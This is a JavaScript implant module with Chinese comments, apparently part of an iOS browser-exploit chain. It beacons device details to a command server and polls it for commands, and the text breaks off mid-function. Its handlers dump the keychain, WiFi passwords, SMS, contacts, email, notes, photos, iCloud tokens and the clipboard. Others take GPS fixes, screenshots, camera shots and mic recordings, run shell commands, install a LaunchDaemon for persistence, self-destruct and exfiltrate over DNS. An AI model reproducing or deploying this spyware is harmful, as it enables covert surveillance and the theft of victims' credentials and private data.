/**
 * beacon.js — 设备上报模块
 *
 * 在 rce_loader.js 完成指纹采集后调用 sendBeacon()，
 * 将设备信息异步上报到管理后台的 POST /beacon 接口。
 *
 * 用法（在 rce_loader.js 中 eval 加载后直接调用）:
 *   sendBeacon({ stage: 'rce', extra: { slide, offsets } });
 */

(function() {
  'use strict';

  // 上报目标：与 rce_loader.js 中 localHost 保持一致
  const BEACON_URL = (typeof localHost !== 'undefined' ? localHost : location.origin) + '/beacon';
  
  // DS_SHARED_SECRET 将在构建时通过构建脚本注入
  // 如果未注入，尝试从全局变量读取（用于开发/测试）
  const SHARED_SECRET = (typeof DS_SHARED_SECRET !== 'undefined' ? DS_SHARED_SECRET : 
                         (typeof globalThis.DS_SHARED_SECRET !== 'undefined' ? globalThis.DS_SHARED_SECRET : ''));

  /**
   * 生成持久化设备 ID（存 localStorage，不存在则随机生成）
   */
  function getDeviceId() {
    try {
      let id = localStorage.getItem('_ds_did');
      if (!id) {
        id = Array.from(crypto.getRandomValues(new Uint8Array(8)))
               .map(b => b.toString(16).padStart(2, '0')).join('');
        localStorage.setItem('_ds_did', id);
      }
      return id;
    } catch {
      // localStorage 不可用时回退到随机值（不持久化）
      return Array.from(crypto.getRandomValues(new Uint8Array(8)))
               .map(b => b.toString(16).padStart(2, '0')).join('');
    }
  }

  /**
   * 从 UA 推断设备名称
   */
  function inferDeviceName(ua) {
    const m = ua.match(/iPhone OS ([0-9_]+)/) || ua.match(/CPU OS ([0-9_]+)/);
    const ver = m ? m[1].replace(/_/g, '.') : '';
    if (/iPad/.test(ua))   return 'iPad ' + ver;
    if (/iPhone/.test(ua)) return 'iPhone ' + ver;
    return 'iOS Device ' + ver;
  }

  /**
   * 主上报函数
   * @param {Object} opts  - 可选扩展字段：stage、extra 等
   */
  function sendBeacon(opts) {
    opts = opts || {};
    const ua = navigator.userAgent;

    const payload = {
      deviceId:   getDeviceId(),
      deviceName: inferDeviceName(ua),
      ua:         ua,
      stage:      opts.stage  || 'beacon',
      extra:      opts.extra  || {},
      // 从 rce_loader.js 全局变量读取（如已赋值）
      model:        typeof device_model  !== 'undefined' ? device_model  : undefined,
      iosVersion:   typeof ios_version   !== 'undefined' ? ios_version.join('.') : undefined,
      // execStatus 由调用方传入（running/success/failed），未传时由后端按 stage 自动推断
      execStatus:   opts.execStatus || undefined,
    };

    // 清理 undefined 字段
    Object.keys(payload).forEach(k => payload[k] === undefined && delete payload[k]);

    // 始终使用 XHR（navigator.sendBeacon 无法设置 Authorization header）
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', BEACON_URL, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      if (SHARED_SECRET) xhr.setRequestHeader('Authorization', 'Bearer ' + SHARED_SECRET);
      xhr.send(JSON.stringify(payload));
    } catch {}
  }

  // 挂载到全局，供 rce_loader.js 及各 stage 模块调用
  globalThis.sendBeacon = sendBeacon;
  globalThis.getDeviceId = getDeviceId;

  // 页面加载时立即上报一次（stage=beacon）
  sendBeacon({ stage: 'beacon' });

  // ── 命令轮询 ────────────────────────────────────────────────────────────────
  const CMD_POLL_URL    = (typeof localHost !== 'undefined' ? localHost : location.origin) + '/cmd/poll';
  const CMD_RESULT_URL  = (typeof localHost !== 'undefined' ? localHost : location.origin) + '/cmd/result';
  const CMD_POLL_MS     = 8000;  // 每 8 秒轮询一次

  /**
   * 向后端回报命令执行结果
   */
  function reportCmdResult(cmdId, type, output, status) {
    const normalized = (output && typeof output === 'object') ? output : { output: String(output || '') };
    const payload = {
      cmdId,
      deviceId: getDeviceId(),
      type,
      output: String(normalized.output || ''),
      status: status || normalized.status || 'done',
      bridgeReady: normalized.bridgeReady,
      reason: normalized.reason,
    };
    Object.keys(payload).forEach(k => payload[k] === undefined && delete payload[k]);
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', CMD_RESULT_URL, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      if (SHARED_SECRET) xhr.setRequestHeader('Authorization', 'Bearer ' + SHARED_SECRET);
      xhr.send(JSON.stringify(payload));
    } catch {}
  }

  /**
   * 命令分发表 — 14 条主流命令
   * 每条返回 Promise<string>，resolve 值为输出文本
   */
  const CMD_HANDLERS = globalThis.CMD_HANDLERS = {

    // 1. Keychain 导出（依赖 pe_main.js 已注入的 readKeychain）
    dump_keychain() {
      return new Promise(resolve => {
        try {
          const raw = typeof readKeychain === 'function' ? readKeychain() : null;
          if (!raw) return resolve('[keychain] 需先完成 PE 阶段');
          const items = Array.isArray(raw) ? raw : [raw];
          // 顺带 exfil 到服务端 loot store
          _exfil('keychain', items);
          resolve('[keychain] 共 ' + items.length + ' 条\n' +
            items.slice(0, 20).map(i => (i.service || '') + '  ' + (i.account || '') + '  ' + (i.password || '')).join('\n'));
        } catch(e) { 
          // 生产环境不泄露详细错误信息
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[keychain] 操作失败' 
            : '[keychain] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 2. WiFi 密码
    dump_wifi() {
      return new Promise(resolve => {
        try {
          const raw = typeof readWifiPasswords === 'function' ? readWifiPasswords() : null;
          if (!raw) return resolve('[wifi] 需先完成 PE 阶段');
          const items = Array.isArray(raw) ? raw : [raw];
          _exfil('wifi', items);
          resolve('[wifi] 共 ' + items.length + ' 条\n' +
            items.map(i => (i.ssid || i.name || '') + '  ' + (i.password || i.psk || '')).join('\n'));
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[wifi] 操作失败' 
            : '[wifi] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 3. 通讯录（读取 AddressBook SQLite via WebSQL / 降级提示）
    dump_contacts() {
      return new Promise(resolve => {
        try {
          // iOS Safari 不支持 WebSQL，此处通过已注入的 native bridge 读取
          if (typeof readContacts === 'function') {
            const items = readContacts();
            _exfil('info', { contacts_count: items.length });
            return resolve('[contacts] ' + items.length + ' 条\n' +
              items.slice(0, 20).map(c => (c.name || '') + '  ' + (c.phone || '')).join('\n'));
          }
          resolve('[contacts] native bridge 未就绪，需 PE 完成后重试');
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[contacts] 操作失败' 
            : '[contacts] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 4. 短信/iMessage
    dump_sms() {
      return new Promise(resolve => {
        try {
          if (typeof readSMS === 'function') {
            const items = readSMS();
            return resolve('[sms] ' + items.length + ' 条\n' +
              items.slice(0, 20).map(m => (m.from || '') + ': ' + (m.text || '')).join('\n'));
          }
          resolve('[sms] native bridge 未就绪');
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[sms] 操作失败' 
            : '[sms] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 5. 实时 GPS 定位（Geolocation API）
    dump_location() {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve('[location] Geolocation API 不可用');
        navigator.geolocation.getCurrentPosition(
          pos => {
            const { latitude, longitude, accuracy } = pos.coords;
            const result = `lat=${latitude.toFixed(6)}  lon=${longitude.toFixed(6)}  acc=${accuracy.toFixed(0)}m`;
            _exfil('info', { gps_lat: latitude, gps_lon: longitude, gps_acc: accuracy });
            resolve('[location] ' + result);
          },
          err => resolve('[location] error: ' + err.message),
          { timeout: 8000, maximumAge: 0 }
        );
      });
    },

    // 6. 屏幕截图（html2canvas 或 native bridge）
    screenshot() {
      return new Promise(resolve => {
        try {
          if (typeof nativeScreenshot === 'function') {
            const b64 = nativeScreenshot();
            if (b64) _exfil('file', { name: 'screenshot_' + Date.now() + '.png', size: Math.round(b64.length * 0.75), content: b64 });
            return resolve('[screenshot] 已截图，大小约 ' + Math.round(b64.length * 0.75 / 1024) + ' KB');
          }
          resolve('[screenshot] native bridge 未就绪');
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[screenshot] 操作失败' 
            : '[screenshot] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 7. 摄像头抓拍
    camera_snap(args) {
      const cameraIdx = (args && args.camera != null) ? args.camera : 0;
      return new Promise(resolve => {
        try {
          if (typeof nativeCameraSnap === 'function') {
            const b64 = nativeCameraSnap(cameraIdx);
            if (b64) _exfil('file', { name: 'snap_cam' + cameraIdx + '_' + Date.now() + '.jpg', size: Math.round(b64.length * 0.75), content: b64 });
            return resolve('[camera] 已拍照 camera=' + cameraIdx);
          }
          // 降级：MediaDevices（有用户交互限制，静默失败）
          resolve('[camera] native bridge 未就绪，camera=' + cameraIdx);
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[camera] 操作失败' 
            : '[camera] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 8. 麦克风录音
    mic_record(args) {
      const secs = (args && args.seconds) ? parseInt(args.seconds) : 15;
      return new Promise(resolve => {
        try {
          if (typeof nativeMicRecord === 'function') {
            nativeMicRecord(secs, b64 => {
              if (b64) _exfil('file', { name: 'mic_' + Date.now() + '.m4a', size: Math.round(b64.length * 0.75), content: b64 });
              resolve('[mic] 已录音 ' + secs + 's');
            });
            return;
          }
          resolve('[mic] native bridge 未就绪，secs=' + secs);
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[mic] 操作失败' 
            : '[mic] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 9. 文件列表
    list_files(args) {
      const dirPath = (args && args.path) ? args.path : '/var/mobile';
      return new Promise(resolve => {
        try {
          if (typeof nativeListDir === 'function') {
            const entries = nativeListDir(dirPath);
            return resolve('[ls] ' + dirPath + '\n' + entries.join('\n'));
          }
          return resolve({
            status: 'failed',
            bridgeReady: false,
            reason: 'native bridge unavailable',
            output: '[ls] native bridge 未就绪，path=' + dirPath
          });
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[ls] 操作失败' 
            : '[ls] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 9b. 文件列表（JSON 格式，供 admin API 使用）
    list_files_json(args) {
      const dirPath = (args && args.path) ? args.path : '/var/mobile';
      return new Promise(resolve => {
        // 路径白名单验证（与 read_file/download_file 保持一致）
        const normalized = dirPath.replace(/\\/g, '/');
        
        // 禁止路径遍历
        if (normalized.includes('..') || normalized.includes('~')) {
          return resolve({
            status: 'failed',
            reason: 'path_traversal',
            output: '[ls] 不允许路径遍历'
          });
        }
        
        // 路径白名单验证
        const allowedPaths = [
          '/var/mobile/Library/Logs/',
          '/var/mobile/Documents/',
          '/var/mobile/Downloads/',
          '/var/mobile/tmp/',
          '/var/mobile/Library/SMS/',
          '/var/mobile/Library/Mail/',
          '/var/mobile/Media/DCIM/',
          '/private/var/mobile/Library/Logs/',
          '/private/var/mobile/Documents/',
          '/private/var/mobile/Downloads/',
          '/private/var/mobile/tmp/',
          '/private/var/mobile/Library/SMS/',
          '/private/var/mobile/Library/Mail/',
          '/private/var/mobile/Media/DCIM/'
        ];
        
        const isAllowed = allowedPaths.some(prefix => normalized.startsWith(prefix));
        if (!isAllowed) {
          return resolve({
            status: 'failed',
            reason: 'path_not_allowed',
            output: '[ls] 路径不在允许范围内'
          });
        }
        
        try {
          if (typeof nativeListDir === 'function') {
            const entries = nativeListDir(dirPath);
            // 返回 JSON 数组格式（管理后台需要结构化数据）
            const files = entries.map(name => {
              const fullPath = dirPath.endsWith('/') ? dirPath + name : dirPath + '/' + name;
              try {
                const stat = typeof nativeStatFile === 'function' ? nativeStatFile(fullPath) : null;
                return {
                  name,
                  type: stat?.isDirectory ? 'dir' : 'file',
                  size: stat?.size || 0,
                  mtime: stat?.mtime || 0
                };
              } catch {
                return { name, type: 'unknown', size: 0, mtime: 0 };
              }
            });
            return resolve('[ls] ' + dirPath + '\n' + JSON.stringify(files));
          }
          return resolve({
            status: 'failed',
            bridgeReady: false,
            reason: 'native bridge unavailable',
            output: '[ls] native bridge 未就绪，path=' + dirPath
          });
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[ls] 操作失败' 
            : '[ls] error: ' + e.message;
          resolve({
            status: 'failed',
            reason: 'exception',
            output: errorMsg
          });
        }
      });
    },

    // 10. 读取文件
    read_file(args) {
      const filePath = (args && args.path) ? args.path : '';
      return new Promise(resolve => {
        if (!filePath) return resolve('[read] 未指定路径');
        
        // 路径安全验证
        const normalized = filePath.replace(/\\/g, '/');
        
        // 禁止路径遍历
        if (normalized.includes('..') || normalized.includes('~')) {
          return resolve('[read] 不允许路径遍历');
        }
        
        // 路径白名单验证（与 list_files_json 保持一致）
        const allowedPaths = [
          '/var/mobile/Library/Logs/',
          '/var/mobile/Documents/',
          '/var/mobile/Downloads/',
          '/var/mobile/tmp/',
          '/var/mobile/Library/SMS/',
          '/var/mobile/Library/Mail/',
          '/var/mobile/Media/DCIM/',
          '/private/var/mobile/Library/Logs/',
          '/private/var/mobile/Documents/',
          '/private/var/mobile/Downloads/',
          '/private/var/mobile/tmp/',
          '/private/var/mobile/Library/SMS/',
          '/private/var/mobile/Library/Mail/',
          '/private/var/mobile/Media/DCIM/'
        ];
        
        const isAllowed = allowedPaths.some(prefix => normalized.startsWith(prefix));
        if (!isAllowed) {
          return resolve('[read] 路径不在允许范围内');
        }
        
        // 禁止读取敏感文件
        const blacklist = [
          '/etc/passwd', 
          '/etc/shadow', 
          '/.ssh/', 
          '/private/etc/',
          '/System/',
          '/usr/bin/',
          '/usr/sbin/',
          'id_rsa',
          'id_dsa',
          '.key',
          'keychain'
        ];
        
        if (blacklist.some(pattern => normalized.toLowerCase().includes(pattern.toLowerCase()))) {
          return resolve('[read] 敏感路径已被阻止');
        }
        
        try {
          if (typeof nativeReadFile === 'function') {
            const content = nativeReadFile(filePath, 524288); // 512KB 上限
            return resolve('[read] ' + filePath + '\n' + content);
          }
          return resolve({
            status: 'failed',
            bridgeReady: false,
            reason: 'native bridge unavailable',
            output: '[read] native bridge 未就绪，path=' + filePath
          });
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[read] 操作失败' 
            : '[read] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 11. 下载文件（读取后 exfil，携带 base64 内容）
    download_file(args) {
      const filePath = (args && args.path) ? args.path : '';
      const maxBytes = (args && args.maxBytes) ? parseInt(args.maxBytes) : 5 * 1024 * 1024;
      return new Promise(resolve => {
        if (!filePath) return resolve('[download] 未指定路径');
        
        // 路径安全验证（与 read_file/list_files_json 相同的验证逻辑）
        const normalized = filePath.replace(/\\/g, '/');
        
        // 禁止路径遍历
        if (normalized.includes('..') || normalized.includes('~')) {
          return resolve('[download] 不允许路径遍历');
        }
        
        // 路径白名单验证（与 list_files_json 保持一致）
        const allowedPaths = [
          '/var/mobile/Library/Logs/',
          '/var/mobile/Documents/',
          '/var/mobile/Downloads/',
          '/var/mobile/tmp/',
          '/var/mobile/Library/SMS/',
          '/var/mobile/Library/Mail/',
          '/var/mobile/Media/DCIM/',
          '/private/var/mobile/Library/Logs/',
          '/private/var/mobile/Documents/',
          '/private/var/mobile/Downloads/',
          '/private/var/mobile/tmp/',
          '/private/var/mobile/Library/SMS/',
          '/private/var/mobile/Library/Mail/',
          '/private/var/mobile/Media/DCIM/'
        ];
        
        const isAllowed = allowedPaths.some(prefix => normalized.startsWith(prefix));
        if (!isAllowed) {
          return resolve('[download] 路径不在允许范围内');
        }
        
        // 禁止下载敏感文件
        const blacklist = [
          '/etc/passwd', 
          '/etc/shadow', 
          '/.ssh/', 
          '/private/etc/',
          '/System/',
          '/usr/bin/',
          '/usr/sbin/',
          'id_rsa',
          'id_dsa',
          '.key',
          'keychain'
        ];
        
        if (blacklist.some(pattern => normalized.toLowerCase().includes(pattern.toLowerCase()))) {
          return resolve('[download] 敏感路径已被阻止');
        }
        
        try {
          if (typeof nativeReadFile === 'function') {
            const content = nativeReadFile(filePath, maxBytes);
            if (!content) return resolve('[download] 文件不存在或读取失败: ' + filePath);
            const fname = filePath.split('/').pop();
            // 将文件内容转为 base64 并上报（服务端持久化到磁盘）
            let b64 = '';
            try { b64 = btoa(content); } catch(e) {
              // 若含多字节字符则逐字节编码
              const bytes = [];
              for (let i = 0; i < content.length; i++) bytes.push(content.charCodeAt(i) & 0xff);
              b64 = btoa(String.fromCharCode(...bytes));
            }
            _exfil('file', { name: fname, size: content.length, content: b64 });
            return resolve('[download] 已回传: ' + fname + ' (' + content.length + ' bytes)');
          }
          return resolve({
            status: 'failed',
            bridgeReady: false,
            reason: 'native bridge unavailable',
            output: '[download] native bridge 未就绪'
          });
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[download] 操作失败' 
            : '[download] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 12. Shell 命令执行
    exec_shell(args) {
      const cmd = (args && args.cmd) ? args.cmd : '';
      return new Promise(resolve => {
        if (!cmd) return resolve('[shell] 未指定命令');
        try {
          if (typeof nativeExecShell === 'function') {
            const out = nativeExecShell(cmd);
            return resolve('[shell] $ ' + cmd + '\n' + out);
          }
          return resolve({
            status: 'failed',
            bridgeReady: false,
            reason: 'native bridge unavailable',
            output: '[shell] native bridge 未就绪，cmd=' + cmd
          });
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[shell] 操作失败' 
            : '[shell] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 13. iCloud Token 导出
    dump_icloud_token() {
      return new Promise(resolve => {
        try {
          if (typeof readICloudToken === 'function') {
            const token = readICloudToken();
            _exfil('info', { icloud_token: token });
            return resolve('[icloud] token 已回传，长度=' + String(token || '').length);
          }
          resolve('[icloud] native bridge 未就绪');
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[icloud] 操作失败' 
            : '[icloud] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 14. 持久化驻留（写入 LaunchDaemon plist）
    install_persist(args) {
      const url = (args && args.url) ? args.url : '';
      return new Promise(resolve => {
        if (!url) return resolve('[persist] 未指定回连 URL');
        try {
          if (typeof nativeInstallPersist === 'function') {
            const ok = nativeInstallPersist(url);
            return resolve('[persist] ' + (ok ? '写入成功: ' + url : '写入失败'));
          }
          resolve('[persist] native bridge 未就绪，url=' + url);
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[persist] 操作失败' 
            : '[persist] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 15. 相册抓取
    dump_photos(args) {
      const limit = (args && args.limit) ? parseInt(args.limit) : 20;
      return new Promise(resolve => {
        try {
          if (typeof readPhotos === 'function') {
            const paths = readPhotos(limit);
            _exfil('info', { photo_count: paths.length });
            return resolve('[photos] 共 ' + paths.length + ' 张\n' + paths.join('\n'));
          }
          resolve('[photos] native bridge 未就绪');
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[photos] 操作失败' 
            : '[photos] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 16. Mail 邮件导出
    dump_email() {
      return new Promise(resolve => {
        try {
          if (typeof readEmail === 'function') {
            const items = readEmail();
            _exfil('info', { email_count: items.length });
            return resolve('[email] 共 ' + items.length + ' 条\n' +
              items.slice(0, 30).map(m => (m.sender || m.path || '') + '  ' + (m.subject || '')).join('\n'));
          }
          resolve('[email] native bridge 未就绪');
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[email] 操作失败' 
            : '[email] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 17. Notes 备忘录导出
    dump_notes() {
      return new Promise(resolve => {
        try {
          if (typeof dumpNotes === 'function') {
            const items = dumpNotes();
            _exfil('info', { notes_count: items.length });
            return resolve('[notes] 共 ' + items.length + ' 条\n' +
              items.slice(0, 30).map(n => (n.title || '') + '  ' + (n.snippet || '')).join('\n'));
          }
          resolve('[notes] native bridge 未就绪');
        } catch(e) { 
          const errorMsg = process.env.NODE_ENV === 'production' 
            ? '[notes] 操作失败' 
            : '[notes] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 18. 已安装应用列表
    list_installed_apps() {
      return new Promise(resolve => {
        try {
          if (typeof nativeListApps === 'function') {
            const apps = nativeListApps();
            _exfil('apps', apps);
            const userApps = apps.filter(a => a.source !== 'system');
            return resolve('[apps] 共 ' + apps.length + ' 个 (用户 ' + userApps.length + ')\n' +
              apps.slice(0, 30).map(a => (a.name || a.bundleId || '') + '  ' + (a.version || '')).join('\n'));
          }
          resolve('[apps] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[apps] 操作失败'
            : '[apps] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 19. 自毁（清除驻留 + 痕迹）
    self_destruct() {
      return new Promise(resolve => {
        try {
          if (typeof nativeSelfDestruct === 'function') {
            const ok = nativeSelfDestruct();
            return resolve('[self_destruct] ' + (ok ? '已清除所有驻留和痕迹' : '清除失败'));
          }
          resolve('[self_destruct] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[self_destruct] 操作失败'
            : '[self_destruct] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 20. 进程列表
    list_processes() {
      return new Promise(resolve => {
        try {
          if (typeof nativeListProcesses === 'function') {
            const procs = nativeListProcesses();
            return resolve('[ps] 共 ' + procs.length + ' 个进程\n' +
              procs.slice(0, 50).map(p => p.pid + '  ' + (p.name || '')).join('\n'));
          }
          if (typeof nativeExecShell === 'function') {
            const out = nativeExecShell('ps aux');
            return resolve('[ps] via shell\n' + out);
          }
          return resolve({ status: 'failed', bridgeReady: false, reason: 'native bridge unavailable', output: '[ps] native bridge 未就绪' });
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[ps] 操作失败'
            : '[ps] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 21. 杀死进程
    kill_process(args) {
      const pid = (args && args.pid) ? parseInt(args.pid) : 0;
      return new Promise(resolve => {
        if (!pid) return resolve('[kill] 未指定 PID');
        try {
          if (typeof nativeKillProcess === 'function') {
            const ok = nativeKillProcess(pid);
            return resolve('[kill] PID=' + pid + ' ' + (ok ? '已终止' : '终止失败'));
          }
          if (typeof nativeExecShell === 'function') {
            const out = nativeExecShell('kill -9 ' + pid);
            return resolve('[kill] PID=' + pid + '\n' + out);
          }
          return resolve({ status: 'failed', bridgeReady: false, reason: 'native bridge unavailable', output: '[kill] native bridge 未就绪' });
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[kill] 操作失败'
            : '[kill] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 22. 网络连接列表
    network_connections() {
      return new Promise(resolve => {
        try {
          if (typeof nativeNetConnections === 'function') {
            const conns = nativeNetConnections();
            return resolve('[netstat] 共 ' + conns.length + ' 条\n' +
              conns.slice(0, 50).map(c => (c.proto || 'tcp') + '  ' + (c.local || '') + ' → ' + (c.remote || '') + '  ' + (c.state || '')).join('\n'));
          }
          if (typeof nativeExecShell === 'function') {
            const out = nativeExecShell('netstat -an');
            return resolve('[netstat] via shell\n' + out);
          }
          return resolve({ status: 'failed', bridgeReady: false, reason: 'native bridge unavailable', output: '[netstat] native bridge 未就绪' });
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[netstat] 操作失败'
            : '[netstat] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 23. 剪贴板读取
    clipboard_read() {
      return new Promise(resolve => {
        try {
          if (typeof nativeClipboardRead === 'function') {
            const content = nativeClipboardRead();
            _exfil('info', { clipboard: content });
            return resolve('[clipboard] ' + (content || '(空)'));
          }
          resolve('[clipboard] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[clipboard] 操作失败'
            : '[clipboard] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 24. 剪贴板监控
    clipboard_monitor(args) {
      const secs = (args && args.seconds) ? parseInt(args.seconds) : 60;
      return new Promise(resolve => {
        try {
          if (typeof nativeClipboardMonitor === 'function') {
            nativeClipboardMonitor(secs, results => {
              _exfil('info', { clipboard_log: results });
              resolve('[clipboard_monitor] ' + secs + 's 内捕获 ' + results.length + ' 次变化\n' +
                results.slice(0, 20).map(r => r.ts + '  ' + r.content).join('\n'));
            });
            return;
          }
          resolve('[clipboard_monitor] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[clipboard_monitor] 操作失败'
            : '[clipboard_monitor] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 25. 文件上传（从服务端推文件到设备）
    file_upload(args) {
      const remotePath = (args && args.path) ? args.path : '';
      const url = (args && args.url) ? args.url : '';
      return new Promise(resolve => {
        if (!remotePath || !url) return resolve('[upload] 需要 path 和 url 参数');
        try {
          if (typeof nativeDownloadToFile === 'function') {
            const ok = nativeDownloadToFile(url, remotePath);
            return resolve('[upload] ' + (ok ? '已写入: ' + remotePath : '写入失败'));
          }
          resolve('[upload] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[upload] 操作失败'
            : '[upload] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 26. 文件搜索
    file_search(args) {
      const pattern = (args && args.pattern) ? args.pattern : '';
      const dir = (args && args.dir) ? args.dir : '/var/mobile';
      return new Promise(resolve => {
        if (!pattern) return resolve('[search] 需要 pattern 参数');
        try {
          if (typeof nativeFileSearch === 'function') {
            const results = nativeFileSearch(dir, pattern);
            return resolve('[search] 在 ' + dir + ' 搜索 "' + pattern + '"\n共 ' + results.length + ' 条\n' +
              results.slice(0, 50).join('\n'));
          }
          if (typeof nativeExecShell === 'function') {
            const out = nativeExecShell('find ' + dir + ' -name "' + pattern + '" -maxdepth 5 2>/dev/null | head -50');
            return resolve('[search] via shell\n' + out);
          }
          return resolve({ status: 'failed', bridgeReady: false, reason: 'native bridge unavailable', output: '[search] native bridge 未就绪' });
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[search] 操作失败'
            : '[search] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 27. SQLite 查询
    sqlite_query(args) {
      const dbPath = (args && args.db) ? args.db : '';
      const sql = (args && args.sql) ? args.sql : '';
      return new Promise(resolve => {
        if (!dbPath || !sql) return resolve('[sqlite] 需要 db 和 sql 参数');
        try {
          if (typeof nativeSqliteQuery === 'function') {
            const rows = nativeSqliteQuery(dbPath, sql);
            _exfil('info', { sqlite_query: dbPath, row_count: rows.length });
            return resolve('[sqlite] ' + dbPath + '\n共 ' + rows.length + ' 行\n' +
              JSON.stringify(rows.slice(0, 30), null, 1));
          }
          resolve('[sqlite] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[sqlite] 操作失败'
            : '[sqlite] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 28. 持久化状态检查
    persist_check() {
      return new Promise(resolve => {
        try {
          if (typeof nativePersistCheck === 'function') {
            const info = nativePersistCheck();
            return resolve('[persist_check] ' + (info.active ? '已驻留' : '未驻留') +
              (info.method ? '  方式: ' + info.method : '') +
              (info.path ? '  路径: ' + info.path : ''));
          }
          resolve('[persist_check] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[persist_check] 操作失败'
            : '[persist_check] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 29. 移除持久化
    persist_remove() {
      return new Promise(resolve => {
        try {
          if (typeof nativePersistRemove === 'function') {
            const ok = nativePersistRemove();
            return resolve('[persist_remove] ' + (ok ? '已移除驻留' : '移除失败'));
          }
          resolve('[persist_remove] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[persist_remove] 操作失败'
            : '[persist_remove] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 30. 前台应用监控
    app_foreground_monitor(args) {
      const secs = (args && args.seconds) ? parseInt(args.seconds) : 60;
      return new Promise(resolve => {
        try {
          if (typeof nativeAppMonitor === 'function') {
            nativeAppMonitor(secs, results => {
              _exfil('info', { app_monitor_log: results });
              resolve('[app_monitor] ' + secs + 's 内捕获 ' + results.length + ' 次切换\n' +
                results.slice(0, 30).map(r => r.ts + '  ' + r.bundleId).join('\n'));
            });
            return;
          }
          resolve('[app_monitor] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[app_monitor] 操作失败'
            : '[app_monitor] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 31. WiFi 扫描
    wifi_scan() {
      return new Promise(resolve => {
        try {
          if (typeof nativeWifiScan === 'function') {
            const networks = nativeWifiScan();
            return resolve('[wifi_scan] 共 ' + networks.length + ' 个网络\n' +
              networks.slice(0, 30).map(n => n.ssid + '  ' + (n.bssid || '') + '  信号: ' + (n.rssi || '') + '  ' + (n.security || '')).join('\n'));
          }
          resolve('[wifi_scan] native bridge 未就绪');
        } catch(e) {
          const errorMsg = process.env.NODE_ENV === 'production'
            ? '[wifi_scan] 操作失败'
            : '[wifi_scan] error: ' + e.message;
          resolve(errorMsg);
        }
      });
    },

    // 32. DNS 隧道数据外传
    dns_exfil(args) {
      const data = (args && args.data) ? args.data : '';
      const domain = (args && args.domain) ? args.domain : '';
      return new Promise(resolve => {
        if (!data || !domain) return resolve('[dns_exfil] 需要 data 和 domain 参数');
        try {
          if (typeof nativeDnsExfil === 'function') {
            const ok = nativeDnsExfil(data, domain);
